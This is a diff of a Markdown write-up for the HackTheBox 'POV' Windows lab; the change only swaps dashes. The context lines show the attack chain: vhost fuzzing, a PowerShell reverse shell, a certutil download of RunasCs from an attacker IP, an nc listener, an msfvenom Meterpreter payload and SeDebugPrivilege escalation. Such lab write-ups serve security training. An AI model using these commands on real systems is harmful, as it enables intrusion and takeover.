@@ -1,4 +1,4 @@
-# HackTheBox —POV
+# HackTheBox - POV
 
 > **Difficulty:** Medium  
 > **OS:** Windows  
@@ -60,7 +60,7 @@ ffuf -u http://10.129.230.183 \
      -fs 12320
 ```
 
-**Result:** One additional virtual host is discovered — `dev.pov.htb`. Add it to `/etc/hosts`:
+**Result:** One additional virtual host is discovered - `dev.pov.htb`. Add it to `/etc/hosts`:
 
 ```
 10.129.230.183  pov.htb dev.pov.htb
@@ -96,7 +96,7 @@ Several directories are returned for later review.
 
 `dev.pov.htb` hosts a developer portfolio. Two things immediately stand out:
 
-1. **"Download CV" button** — triggers a POST request with a `file` parameter in the body.
+1. **"Download CV" button** - triggers a POST request with a `file` parameter in the body.
 2. **A user review** hints at poor secure coding practices in **ASP.NET**.
 3. The contact page URL ends in `contact.aspx`, confirming an ASP.NET backend.
 
@@ -190,7 +190,7 @@ Generate a PowerShell reverse shell (base64-encoded) at [revshells.com](https://
 
 ---
 
-## 6. Lateral Movement — sfitz → alaading
+## 6. Lateral Movement - sfitz → alaading
 
 ### Credential Discovery
 
@@ -214,7 +214,7 @@ $cred.GetNetworkCredential().Password
 
 ### Spawning a Shell as alaading
 
-Standard `runas` doesn't work in this context. Instead, we use [RunasCs](https://github.com/antonioCoco/RunasCs) — an improved `runas` implementation.
+Standard `runas` doesn't work in this context. Instead, we use [RunasCs](https://github.com/antonioCoco/RunasCs) - an improved `runas` implementation.
 
 **Build on Windows:**
 
@@ -241,7 +241,7 @@ certutil.exe -urlcache -f http://10.10.14.46:8000/RunasCs.exe RunasCs.exe
 
 
 ```bash
-# Attacker — listener
+# Attacker - listener
 nc -lvnp 4444
 ```
 
@@ -255,7 +255,7 @@ nc -lvnp 4444
 
 ---
 
-## 7. Privilege Escalation — SeDebugPrivilege → SYSTEM
+## 7. Privilege Escalation - SeDebugPrivilege → SYSTEM
 
 ### Identifying the Privilege
 
@@ -263,13 +263,13 @@ nc -lvnp 4444
 whoami /priv
 ```
 
-`alaading` holds **SeDebugPrivilege** — this allows opening handles to processes owned by other users, including SYSTEM.
+`alaading` holds **SeDebugPrivilege** - this allows opening handles to processes owned by other users, including SYSTEM.
 
 <img width="788" height="171" alt="Pasted image 20260515182413" src="https://github.com/user-attachments/assets/95977c41-dc54-437a-9a33-a31411a2629e" />
 
 ### Exploitation via Meterpreter Process Migration
 
-**Step 1 — Generate a Meterpreter payload:**
+**Step 1 - Generate a Meterpreter payload:**
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp \
@@ -277,9 +277,9 @@ msfvenom -p windows/meterpreter/reverse_tcp \
          -f exe > shell1.exe
 ```
 
-**Step 2 — Transfer and execute** (same method as before via certutil).
+**Step 2 - Transfer and execute** (same method as before via certutil).
 
-**Step 3 — Set up Metasploit handler:**
+**Step 3 - Set up Metasploit handler:**
 
 ```
 msfconsole -q
@@ -290,7 +290,7 @@ set LPORT 7777
 exploit
 ```
 
-**Step 4 — Migrate to a SYSTEM process:**
+**Step 4 - Migrate to a SYSTEM process:**
 
 In the Meterpreter session:
 
